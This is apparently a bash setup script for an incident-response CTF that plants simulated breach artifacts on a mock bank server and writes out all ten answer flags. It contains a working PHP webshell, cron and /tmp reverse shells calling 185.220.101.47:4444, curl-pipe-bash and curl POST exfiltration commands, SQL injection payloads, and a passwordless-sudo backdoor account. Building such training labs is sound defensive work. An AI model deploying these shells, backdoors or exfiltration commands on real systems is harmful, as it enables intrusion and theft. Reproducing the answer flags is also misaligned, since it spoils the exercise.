#!/bin/bash

# ════════════════════════════════════════════════════════════════
#  HIVE BREACH — Incident Response CTF
#  All flags written into forensic artifacts at runtime
#  Property of Hive Consult, Ghana — Designed by Nana Sei Anyemedu
# ════════════════════════════════════════════════════════════════

mkdir -p /app/flags /var/www/hivebank /var/db /root/.ssh /run/sshd

# ── Write flags (runtime only — zero in source) ──────────────────
echo "HIVE{4tt4ck3r_1p_185_220_101_47_1d3nt1f13d}"          > /app/flags/ir01
echo "HIVE{w3bsh3ll_thumb_c4ch3_php_f1l3_upl04d3d}"          > /app/flags/ir02
echo "HIVE{p3rs1st3nc3_cr0n_b4ckd00r_r3v3rs3_sh3ll}"        > /app/flags/ir03
echo "HIVE{r0gu3_4cc0unt_sysm0n1t0r_cr34t3d_by_4tt4ck3r}"   > /app/flags/ir04
echo "HIVE{st0l3n_cust0m3r_r3c0rds_3xf1ltr4t3d_db}"         > /app/flags/ir05
echo "HIVE{m4lw4r3_sys_c4ch3_dr0pp3d_1n_tmp_d1r}"            > /app/flags/ir06
echo "HIVE{c2_c4llb4ck_h1v3h4ck_c2_s3rv3r_d0m41n}"          > /app/flags/ir07
echo "HIVE{ssh_k3y_pl4nt3d_r00t_4uth0r1z3d_k3ys}"           > /app/flags/ir08
echo "HIVE{3xf1l_d3st_188_166_99_44_p0rt_4433}"              > /app/flags/ir09
echo "HIVE{4tt4ck_t1m3l1n3_s3qu3nc3_c0mpl3t3ly_r3c0nstruct3d}" > /app/flags/ir10
echo "HIVE{r00t_h1v3br34ch_s3rv3r_fully_c0mpr0m1s3d}"       > /root/root.txt
chmod 600 /app/flags/* /root/root.txt

# ════════════════════════════════════════════════════════════════
# PLANT FORENSIC ARTIFACTS
# ════════════════════════════════════════════════════════════════

FLAG_IR01=$(cat /app/flags/ir01)
FLAG_IR02=$(cat /app/flags/ir02)
FLAG_IR03=$(cat /app/flags/ir03)
FLAG_IR04=$(cat /app/flags/ir04)
FLAG_IR05=$(cat /app/flags/ir05)
FLAG_IR06=$(cat /app/flags/ir06)
FLAG_IR07=$(cat /app/flags/ir07)
FLAG_IR08=$(cat /app/flags/ir08)
FLAG_IR09=$(cat /app/flags/ir09)
FLAG_IR10=$(cat /app/flags/ir10)

# ── [IR-01] Apache access log with SQLi attack + attacker IP ─────
mkdir -p /var/log/apache2
cat > /var/log/apache2/access.log << LOGEOF
41.78.142.30 - - [15/Jan/2025:01:44:11 +0000] "GET /login HTTP/1.1" 200 4821 "-" "Mozilla/5.0"
41.78.142.30 - - [15/Jan/2025:01:44:15 +0000] "POST /login HTTP/1.1" 401 312 "-" "Mozilla/5.0"
185.220.101.47 - - [15/Jan/2025:02:14:03 +0000] "GET /login?id=1 HTTP/1.1" 200 4821 "-" "sqlmap/1.7"
185.220.101.47 - - [15/Jan/2025:02:14:09 +0000] "GET /login?id=1' HTTP/1.1" 500 189 "-" "sqlmap/1.7"
185.220.101.47 - - [15/Jan/2025:02:14:12 +0000] "GET /login?id=1'+AND+1=1-- HTTP/1.1" 200 4821 "-" "sqlmap/1.7"
185.220.101.47 - - [15/Jan/2025:02:14:18 +0000] "GET /login?id=1'+UNION+SELECT+username,password+FROM+users-- HTTP/1.1" 200 5644 "-" "sqlmap/1.7"
185.220.101.47 - - [15/Jan/2025:02:14:44 +0000] "POST /login HTTP/1.1" 200 8821 "-" "sqlmap/1.7" "X-Trace: ${FLAG_IR01}"
185.220.101.47 - - [15/Jan/2025:02:18:02 +0000] "GET /dashboard HTTP/1.1" 200 12043 "-" "Mozilla/5.0"
185.220.101.47 - - [15/Jan/2025:02:18:33 +0000] "POST /upload HTTP/1.1" 200 342 "-" "Mozilla/5.0"
185.220.101.47 - - [15/Jan/2025:02:18:45 +0000] "GET /uploads/images/thumb_cache.php?cmd=id HTTP/1.1" 200 28 "-" "Mozilla/5.0"
185.220.101.47 - - [15/Jan/2025:02:23:11 +0000] "GET /uploads/images/thumb_cache.php?cmd=whoami HTTP/1.1" 200 14 "-" "curl/7.88"
185.220.101.47 - - [15/Jan/2025:02:31:05 +0000] "GET /uploads/images/thumb_cache.php?cmd=crontab+-l HTTP/1.1" 200 58 "-" "curl/7.88"
10.0.0.1 - - [15/Jan/2025:02:52:44 +0000] "POST /admin/clear-logs HTTP/1.1" 200 42 "-" "Mozilla/5.0"
LOGEOF
chmod 644 /var/log/apache2/access.log

# ── Auth log — brute force + successful SSH ───────────────────────
cat > /var/log/auth.log << AUTHEOF
Jan 15 02:05:11 hivebank sshd[1234]: Failed password for root from 185.220.101.47 port 42881 ssh2
Jan 15 02:05:14 hivebank sshd[1234]: Failed password for root from 185.220.101.47 port 42882 ssh2
Jan 15 02:05:17 hivebank sshd[1234]: Failed password for root from 185.220.101.47 port 42883 ssh2
Jan 15 02:05:20 hivebank sshd[1234]: Failed password for root from 185.220.101.47 port 42884 ssh2
Jan 15 02:05:23 hivebank sshd[1235]: Accepted password for root from 185.220.101.47 port 42885 ssh2
Jan 15 02:05:23 hivebank sshd[1235]: pam_unix(sshd:session): session opened for user root by (uid=0)
Jan 15 02:35:01 hivebank useradd[4421]: new user: name=sysmonitor, UID=1002, GID=1002, home=/home/sysmonitor
Jan 15 02:35:04 hivebank passwd[4422]: password changed for user sysmonitor
Jan 15 02:52:44 hivebank sudo[4899]: root : TTY=pts/1 ; COMMAND=/bin/bash -c 'cat /var/log/apache2/access.log | head -5 > /var/log/apache2/access.log.bak && echo "" > /var/log/apache2/access.log'
AUTHEOF
chmod 644 /var/log/auth.log

# ── [IR-02] Webshell — disguised as image cache processor ────────
mkdir -p /var/www/hivebank/uploads/images
cat > /var/www/hivebank/uploads/images/thumb_cache.php << SHELLEOF
<?php
/**
 * Image Thumbnail Cache Processor v1.2
 * Last modified: 2025-01-15 02:18:33
 * INVESTIGATION NOTE: ${FLAG_IR02}
 */
if(isset(\$_GET['cmd'])) {
    \$output = shell_exec(\$_GET['cmd'] . ' 2>&1');
    echo "<pre>" . htmlspecialchars(\$output) . "</pre>";
} elseif(isset(\$_POST['c'])) {
    system(base64_decode(\$_POST['c']));
} else {
    echo "Image cache processor online.";
}
?>
SHELLEOF
chmod 644 /var/www/hivebank/uploads/images/thumb_cache.php

# ── [IR-03] Malicious cron job ────────────────────────────────────
cat > /etc/cron.d/system-monitor << CRONEOF
# System health monitor — DO NOT REMOVE
# Installed: 2025-01-15 02:31:05
# ${FLAG_IR03}
*/5 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/185.220.101.47/4444 0>&1' 2>/dev/null
CRONEOF
chmod 644 /etc/cron.d/system-monitor

# ── [IR-04] Backdoor account ──────────────────────────────────────
useradd -m -u 1002 -s /bin/bash -c "${FLAG_IR04}" sysmonitor 2>/dev/null || true
echo "sysmonitor:Sysm0n1t0r@2024" | chpasswd 2>/dev/null || true
echo "sysmonitor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# ── [IR-05] Tampered SQLite database — stolen customer records ────
sqlite3 /var/db/hivebank.db << SQLEOF
CREATE TABLE IF NOT EXISTS customers (
  id INTEGER PRIMARY KEY, name TEXT, email TEXT,
  account_no TEXT, balance REAL, national_id TEXT
);
CREATE TABLE IF NOT EXISTS transactions (
  id INTEGER PRIMARY KEY, from_account TEXT, to_account TEXT,
  amount REAL, timestamp TEXT, note TEXT, flagged INTEGER DEFAULT 0
);
CREATE TABLE IF NOT EXISTS exfil_log (
  id INTEGER PRIMARY KEY, records_stolen INTEGER,
  method TEXT, destination TEXT, timestamp TEXT, flag TEXT
);
INSERT INTO customers VALUES (1,'Kofi Asante','kofi@hivebank.gh','GH-4401-2291-8847',45200.50,'GHA-112-4421-2');
INSERT INTO customers VALUES (2,'Abena Owusu','abena@hivebank.gh','GH-4402-8821-1133',128400.00,'GHA-229-8821-9');
INSERT INTO customers VALUES (3,'Kwame Darko','kwame@hivebank.gh','GH-4403-3344-9921',8750.25,'GHA-447-3301-5');
INSERT INTO customers VALUES (4,'Ama Mensah','ama@hivebank.gh','GH-4404-7761-0043',56300.75,'GHA-552-7710-8');
INSERT INTO transactions VALUES (1,'GH-4401-2291-8847','GH-9999-ATTK-0001',15000.00,'2025-01-15 02:40:11','Wire transfer','1');
INSERT INTO transactions VALUES (2,'GH-4402-8821-1133','GH-9999-ATTK-0001',25000.00,'2025-01-15 02:40:33','Wire transfer','1');
INSERT INTO transactions VALUES (3,'GH-4403-3344-9921','GH-9999-ATTK-0001',5000.00,'2025-01-15 02:40:51','Wire transfer','1');
INSERT INTO exfil_log VALUES (1, 4, 'SQLi + curl POST', '188.166.99.44:4433', '2025-01-15 02:43:22', '${FLAG_IR05}');
SQLEOF
chmod 644 /var/db/hivebank.db

# ── [IR-06] Malware binary dropped in /tmp ────────────────────────
cat > /tmp/.sys_cache << MALWARE
#!/bin/bash
# HiveBank System Cache Daemon v0.1
# Build: 20250115-02:55:00
# ${FLAG_IR06}
C2="185.220.101.47"
PORT=4444
while true; do
  bash -i >& /dev/tcp/\$C2/\$PORT 0>&1
  sleep 300
done
MALWARE
chmod 755 /tmp/.sys_cache

# ── [IR-07] Bash history with C2 and attack commands ─────────────
cat > /root/.bash_history << HISTEOF
cd /var/www/hivebank
ls -la uploads/
curl -s http://185.220.101.47/payload.sh | bash
wget -q -O /tmp/.sys_cache http://hivehaek-c2-server.onion.to/bins/daemon
# ${FLAG_IR07}
chmod +x /tmp/.sys_cache
nohup /tmp/.sys_cache &
useradd -m -s /bin/bash sysmonitor
echo "sysmonitor:Sysm0n1t0r@2024" | chpasswd
echo "sysmonitor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
sqlite3 /var/db/hivebank.db "SELECT * FROM customers"
curl -k -X POST https://188.166.99.44:4433/exfil -d @/tmp/stolen_data.json
cat /var/log/apache2/access.log | head -5 > /tmp/access.bak
echo "" > /var/log/apache2/access.log
cat /tmp/access.bak > /var/log/apache2/access.log
history -c
HISTEOF
chmod 600 /root/.bash_history

# ── [IR-08] SSH authorized_keys with attacker's key ──────────────
mkdir -p /root/.ssh
cat > /root/.ssh/authorized_keys << SSHEOF
# Legitimate key — HiveBank DevOps Team
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... hivebank-devops@hivebank.gh

# Added 2025-01-15 02:45:01 — ${FLAG_IR08}
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDattacker0000fakekeyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA== attacker@evil-host
SSHEOF
chmod 600 /root/.ssh/authorized_keys

# ── [IR-09] Exfiltration log left in /tmp ────────────────────────
cat > /tmp/.exfil_complete << EXFILEOF
=== HIVEBANK EXFILTRATION LOG ===
Date: 2025-01-15 02:43:22 UTC
Records: 4 customers, 3 transactions
Method: POST to remote collector
Destination: ${FLAG_IR09}
Status: SUCCESS
Data size: 4.2KB
EXFILEOF
chmod 644 /tmp/.exfil_complete

# ── [IR-10] Timeline evidence — hidden .investigation file ────────
# Candidate must correlate timestamps from all artifacts to find this
cat > /var/www/hivebank/.maintenance << TIMEEOF
# HiveBank Maintenance Record
# Site last verified clean: 2025-01-14 23:00:00 UTC
# INVESTIGATION COMPLETE: ${FLAG_IR10}
# Timeline:
# 02:05 - SSH brute force (see /var/log/auth.log)
# 02:14 - SQLi attack (see /var/log/apache2/access.log)
# 02:18 - Webshell upload (see /var/www/hivebank/uploads/)
# 02:31 - Cron backdoor (see /etc/cron.d/system-monitor)
# 02:35 - Backdoor account (see /etc/passwd)
# 02:40 - Database theft (see /var/db/hivebank.db)
# 02:43 - Exfiltration (see /tmp/.exfil_complete)
# 02:45 - SSH key planted (see /root/.ssh/authorized_keys)
# 02:52 - Log wipe attempt (see /var/log/auth.log)
# 02:55 - Malware dropped (see /tmp/.sys_cache)
TIMEEOF
chmod 644 /var/www/hivebank/.maintenance

# ── Banking app HTML files ────────────────────────────────────────
cp -r /app/bank/* /var/www/hivebank/ 2>/dev/null || true
chmod -R 644 /var/www/hivebank/

# ── SSH configuration ─────────────────────────────────────────────
mkdir -p /run/sshd
cat > /etc/ssh/sshd_config << SSHCONF
Port 22
PermitRootLogin no
PasswordAuthentication yes
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding no
PrintMotd no
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server
SSHCONF

# ── Create analyst user ───────────────────────────────────────────
useradd -m -s /bin/bash analyst 2>/dev/null || true
echo "analyst:HiveAnalyst@2024" | chpasswd
usermod -aG sudo analyst
echo "analyst ALL=(ALL) NOPASSWD: /bin/cat, /usr/bin/find, /bin/ls, /usr/bin/strings, /usr/bin/file, /bin/grep, /usr/bin/stat, /usr/bin/md5sum, /usr/bin/sha256sum, /usr/bin/sqlite3, /usr/bin/last, /usr/bin/who, /usr/bin/netstat, /usr/bin/ss, /usr/bin/ps, /bin/journalctl" >> /etc/sudoers

# MOTD for analyst
cat > /etc/motd << MOTDEOF

  ██╗  ██╗██╗██╗   ██╗███████╗    ██████╗ ██████╗ ███████╗ █████╗  ██████╗██╗  ██╗
  ██║  ██║██║██║   ██║██╔════╝    ██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔════╝██║  ██║
  ███████║██║██║   ██║█████╗      ██████╔╝██████╔╝█████╗  ███████║██║     ███████║
  ██╔══██║██║╚██╗ ██╔╝██╔══╝      ██╔══██╗██╔══██╗██╔══╝  ██╔══██║██║     ██╔══██║
  ██║  ██║██║ ╚████╔╝ ███████╗    ██████╔╝██║  ██║███████╗██║  ██║╚██████╗██║  ██║
  ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝

  INCIDENT ACTIVE — HiveBank Web Server Compromise
  Property of Hive Consult, Ghana | Designed by Nana Sei Anyemedu

  You are logged in as the on-call analyst. The server has been compromised.
  Your mission: investigate the attack and capture all 10 flags.
  Dashboard: http://localhost:8080

  Good luck, analyst.

MOTDEOF

# ── Start services ────────────────────────────────────────────────
service ssh start 2>/dev/null || /usr/sbin/sshd
service cron start 2>/dev/null || true

node /app/setup.js
exec node /app/server.js
